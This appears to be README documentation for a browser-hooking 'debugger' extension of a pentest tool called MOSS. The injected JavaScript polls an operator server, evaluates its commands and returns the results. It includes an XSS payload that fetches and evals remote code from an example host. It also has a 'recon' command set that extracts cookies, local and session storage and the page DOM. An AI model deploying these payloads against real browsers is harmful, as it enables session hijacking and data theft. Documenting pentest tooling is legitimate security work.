# Debugger Extension (`ext/debugger.py`)

Interactive JS Debugging Agent for MOSS.

Serves a browser-injectable JS payload allowing an operator or pentester remote control of a browser session. The browser polls the server for pending commands, executes them, and posts results back. Includes a TUI for interactive control, optional encryption, and a script command system for reusable command collections.

## Quick Start

```shell
moss -e debugger -p 8000 --hostname example.com
```

Then inject the JS payload into a browser context:

```html
<script src="http://example.com:8000/debugger/{RANDOM}"></script>
```

Or as an XSS payload:

```
javascript:fetch("http://example.com:8000/debugger/{RANDOM}").then(r => r.text()).then(code => eval(code))
```

Once a browser connects, the TUI prompt shows `debug [1 conns]> `. Type a JS expression:

```
debug [1 conns]> document.cookie
```

The result appears as:

```
 ✓ [2026-05-23 07:42:00] (document.cookie) (browser1) sessionid=abc123
```

## CLI Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--debugger-path PATH` | `/debugger/{RANDOM}` | URL path for the JS payload. Use `{RANDOM}` to insert a random segment. |
| `--debugger-id-length N` | `6` | Length of the random path segment. |
| `--debugger-no-input` | `False` | Disable the TUI input thread (useful for testing/headless modes). |
| `--debugger-minify-js` | `False` | Minify the JS payload using `rjsmin` (optional pip package). |
| `--debugger-key KEYSTRING` | `""` | Enable AES-256-GCM-style XOR+MAC encryption with this passphrase (SHA-256 hashed, stdlib-only). |

## Endpoints

| Path | Method | Description |
|------|--------|-------------|
| `/{base}` | GET | Serves the JavaScript agent payload (`text/javascript`). |
| `/{base}/html` | GET | Same JS wrapped in `<script>` tags (`text/html`), convenient for navigating in a browser, for testing purposes. |
| `/{base}/pending?name=X&last_id=N` | GET | Poll for pending commands. Returns JSON array or encrypted blob. |
| `/{base}/result` | POST | Submit command results. Accepts `{"id": N, "name": "X", "result": "..."}` or encrypted equivalent. |

## TUI Commands


### `sleep <delay> <jitter>`

Inside the connected browser, a special sleep command controls polling frequency:

```javascript
sleep 10        // poll every 10 seconds
sleep 2 50      // poll every 2 seconds with 50% jitter
```

Note: No slash is needed. The command is parsed on the client-side.

### `/help`

Displays all available commands.

### `/conns`

Lists connected browsers with last poll time:

```
debug [1 conns]> /conns
  127.0.0.1_browser1 (last poll: 2.3s ago)
```

### `/target <name>`

Target a specific browser by name. Subsequent commands are delivered only to that browser.

```
debug [1 conns]> /target browser1
debug [browser1]> document.cookie
```

Use `/target` (no arg) or `/target *` to broadcast to all browsers.

### `/broadcast <command>`

Send a command to all browsers regardless of current target.

### `/clear`

Clear all pending commands.


### `/load <path>`

Load a `.json` script file at runtime. Path resolution (in order):

1. **Absolute path** — used directly.
2. **Debugger scripts directory** — `moss/ext/debugger/<path>` (relative to the moss package).
3. **Current working directory** — `os.getcwd()/<path>`.

If not found, prints an error and continues.


### `/run [script[.cmd] [args...]]`

Execute script commands loaded from `.json` script files.

| Form | Behavior |
|------|----------|
| `/run` | List all loaded scripts and their commands. |
| `/run scriptname` | List commands in a script with descriptions and arg counts. |
| `/run scriptname.cmd` | Execute a command (no args). |
| `/run scriptname.cmd arg0 "arg 1"` | Execute with positional args; `{0}`, `{1}` are substituted. |

Examples:

```
debug [1 conns]> /load recon.json
  Loaded 5 command(s) from 'recon' (C:\...\recon.json)
debug [1 conns]> /run recon.cookies
  Queued: recon.cookies

debug [1 conns]> /run recon.fetch http://example.com
  Queued: recon.fetch http://example.com
```

When run via `/run`, the result label shows the shorthand command name (e.g. `recon.cookies`) rather than the expanded JS code.


## Collection System

Scripts are JSON files defining reusable commands with namespacing, arg substitution, and descriptions.

### JSON Schema

```json
{
  "$schema": "https://json-schema.org/draft-07/schema#",
  "type": "object",
  "required": ["commands"],
  "additionalProperties": false,
  "properties": {
    "name": {
      "type": "string",
      "description": "Script name for namespacing (defaults to filename stem)"
    },
    "commands": {
      "type": "object",
      "description": "Map of command names to definitions",
      "patternProperties": {
        "^[a-zA-Z_][a-zA-Z0-9_-]*$": { "$ref": "#/definitions/command" }
      },
      "additionalProperties": false,
      "minProperties": 1
    }
  },
  "definitions": {
    "command": {
      "type": "object",
      "required": ["code"],
      "additionalProperties": false,
      "properties": {
        "code": {
          "type": "string",
          "description": "JavaScript code. Use {0}, {1}, etc. for positional arguments"
        },
        "description": {
          "type": "string",
          "description": "Human-readable description"
        },
        "args": {
          "type": "integer",
          "minimum": 0,
          "default": 0,
          "description": "Number of positional arguments expected"
        }
      }
    }
  }
}
```

### Schema Validation

JSON files are validated against this schema using the `jsonschema` Python package (optional dependency). If `jsonschema` is not installed, validation is skipped and a warning is printed.

```
pip install jsonschema
```

### Sample Collection (`moss/ext/debugger/recon.json`)

```json
{
  "name": "recon",
  "commands": {
    "cookies": {
      "code": "document.cookie",
      "description": "Get all cookies for the current page"
    },
    "url": {
      "code": "location.href",
      "description": "Get the current page URL"
    },
    "dom": {
      "code": "document.documentElement.outerHTML",
      "description": "Get the full DOM as a string"
    },
    "fetch": {
      "code": "void fetch('{0}').then(r=>r.text()).then(t=>_sendResult(m.id,t))",
      "description": "Fetch a URL and return the response body as result",
      "args": 1
    },
    "localStorage": {
      "code": "JSON.stringify(Object.fromEntries(localStorage))",
      "description": "Get all localStorage entries serialised as JSON"
    },
    "sessionStorage": {
      "code": "JSON.stringify(Object.fromEntries(sessionStorage))",
      "description": "Get all sessionStorage entries serialised as JSON"
    }
  }
}
```

### The `_sendResult` Function

Script commands can use the `_sendResult(id, result, error)` function to asynchronously send results back. This is useful for async patterns like `fetch()`:

```javascript
void fetch('{0}').then(r=>r.text()).then(t=>_sendResult(m.id,t))
```

**Mechanism:**

1. The browser agent uses `eval(m.code)`.

2. If `eval` returns a value (not `undefined`), it is automatically sent as the result.

3. If `eval` returns `undefined`, the result is assumed to have been sent manually via `_sendResult` — the agent skips auto-sending.

4. Use `void` to explicitly return `undefined` when using `_sendResult`:
   ```javascript
   void doSomething().then(r => _sendResult(m.id, r))
   ```
   Without `void`, the promise chain's return value (a Promise) would be auto-sent as `[object Promise]`.

5. `_sendResult` handles encryption transparently — if `--debugger-key` is set, the result is encrypted before sending. It also updates `lastId` immediately, so the next poll won't re-process the same command.

6. The function signature:
   - `id` — the command ID (always available as `m.id`)
   - `result` — the result value (stringified automatically)
   - `error` — optional error string; if provided, the result is treated as an error

### Script Loading at Startup

Scripts are loaded at runtime via `/load <path>`. There is no CLI flag for pre-loading scripts at startup.

## Encryption

Enable with `--debugger-key "your passphrase"`:

```shell
moss -e debugger -p 8000 --hostname example.com --debugger-key "s3cr3t"
```

When encryption is enabled:

- Pending commands are encrypted with AES-256-GCM-style XOR+MAC using SHA-256 key derivation.
- Results from the browser are similarly encrypted.
- The JS payload includes pure-JS SHA-256 + XOR+MAC crypto functions (no `crypto.subtle` dependency — works in all browsers).
- `_sendResult` handles encryption transparently.
- Note: As this is symmetric encryption, the key is also sent to the client. The idea is to add a layer of protection against MITM and tampering, which isn't completely defeated, but some encryption is better than nothing, right?

**Format:** `base64(12-byte nonce).base64(ciphertext).base64(16-byte mac)` — same wire format as AES-GCM.

**Integrity:** The MAC ensures tampering is detected. Tampered results return a `400 Bad Request`.

## JavaScript Payload

The browser agent (`BROWSER_JS`) is an IIFE that:

1. Registers a `_sendResult` function for manual result submission.
2. Polls `GET /{base}/pending?name=ID&last_id=N` every ~5s (configurable via `sleep N` or `sleep N jitter` commands).
3. Processes pending commands via `eval(m.code)`.
4. Sends results to `POST /{base}/result`.
5. Handles encryption/decryption transparently.
